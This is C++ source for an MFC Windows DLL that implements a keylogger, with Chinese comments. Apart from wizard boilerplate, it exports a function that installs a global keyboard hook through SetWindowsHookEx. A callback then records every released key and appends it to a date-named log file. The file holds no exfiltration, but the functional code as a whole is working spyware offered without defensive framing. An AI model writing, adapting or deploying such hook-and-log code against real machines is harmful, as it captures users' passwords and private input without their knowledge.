// KeyHook.cpp : Defines the initialization routines for the DLL.
//

#include "stdafx.h"
#include "KeyHook.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

//
//	Note!
//
//		If this DLL is dynamically linked against the MFC
//		DLLs, any functions exported from this DLL which
//		call into MFC must have the AFX_MANAGE_STATE macro
//		added at the very beginning of the function.
//
//		For example:
//
//		extern "C" BOOL PASCAL EXPORT ExportedFunction()
//		{
//			AFX_MANAGE_STATE(AfxGetStaticModuleState());
//			// normal function body here
//		}
//
//		It is very important that this macro appear in each
//		function, prior to any calls into MFC.  This means that
//		it must appear as the first statement within the 
//		function, even before any object variable declarations
//		as their constructors may generate calls into the MFC
//		DLL.
//
//		Please see MFC Technical Notes 33 and 58 for additional
//		details.
//

/////////////////////////////////////////////////////////////////////////////
// CKeyHookApp
HHOOK Hook;
LRESULT CALLBACK Hookkey(int nCode,WPARAM wParam,LPARAM lParam);
void Savekey(char* c);


BEGIN_MESSAGE_MAP(CKeyHookApp, CWinApp)
	//{{AFX_MSG_MAP(CKeyHookApp)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CKeyHookApp construction

CKeyHookApp::CKeyHookApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CKeyHookApp object

CKeyHookApp theApp;

DllExport void WINAPI OutEv()//安装全局钩子
{
	Hook=(HHOOK)SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)Hookkey,theApp.m_hInstance,0);
}

LRESULT CALLBACK Hookkey(int nCode,WPARAM wParam,LPARAM lParam)//回调函数
{
	LRESULT Result=CallNextHookEx(Hook,nCode,wParam,lParam);
	if(nCode==HC_ACTION)
	{
		if(lParam & 0x80000000)
		{
			char c[1];
			c[0]=wParam;
			Savekey(c);
		}
	}
	return Result;
} 

void Savekey(char* c)//记录按键信息
{
	CTime tm=CTime::GetCurrentTime();//获取当前时间
	CString name;
	name.Format("Key_%d_%d.log",tm.GetMonth(),tm.GetDay());
	CFile file;
	if(!file.Open(name,CFile::modeReadWrite))//创建文件
	{
		file.Open(name,CFile::modeCreate|CFile::modeReadWrite);
	}
	file.SeekToEnd();//定位到文件末尾
	file.Write(c,1);//写数据
	file.Close();
}
